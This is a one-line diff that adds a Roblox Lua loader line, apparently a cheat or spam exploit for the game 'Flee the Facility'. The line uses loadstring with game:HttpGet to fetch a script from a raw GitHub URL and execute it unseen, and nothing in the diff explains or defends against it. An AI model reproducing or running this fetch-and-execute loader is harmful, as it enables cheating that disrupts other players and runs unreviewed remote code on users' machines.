@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/flee-the-facility-spam3-t0a3vvoro3waes.lua"))()
